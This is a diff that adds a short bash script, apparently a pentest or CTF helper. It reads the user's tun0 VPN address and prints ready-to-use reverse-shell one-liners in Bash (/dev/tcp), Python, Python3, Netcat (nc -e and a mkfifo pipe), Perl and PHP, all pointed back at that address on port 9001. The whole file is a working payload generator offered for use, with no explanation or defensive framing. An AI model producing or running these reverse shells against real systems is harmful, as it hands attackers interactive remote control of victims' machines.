@@ -1,0 +1,38 @@
+#!/bin/bash
+
+greenColour="\e[0;32m\033[1m"
+endColour="\033[0m\e[0m"
+redColour="\e[0;31m\033[1m"
+blueColour="\e[0;34m\033[1m"
+yellowColour="\e[0;33m\033[1m"
+purpleColour="\e[0;35m\033[1m"
+turquoiseColour="\e[0;36m\033[1m"
+grayColour="\e[0;37m\033[1m"
+
+ip=$(ifconfig tun0 | grep inet | grep -v inet6 | awk '{print $2}')
+port="9001" 			# Change this to your preferred port
+
+#Bash
+echo -e "${yellowColour}Bash${endColour}"
+echo -e "bash -i >& /dev/tcp/$ip/$port 0>&1\r\n"
+
+
+#Python
+echo -e "${yellowColour}Python${endColour}"
+echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\r\n"
+echo -e "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\r\n"
+
+
+#Nc
+echo -e "${yellowColour}Netcat${endColour}"
+echo -e "nc -e /bin/sh $ip $port"
+echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f \r\n"
+
+#Perl
+echo -e "${yellowColour}Perl${endColour}"
+echo -e "perl -e 'use Socket;$i=\"$ip\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\r\n"
+
+
+#PHP
+echo -e "${yellowColour}PHP${endColour}"
+echo -e "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
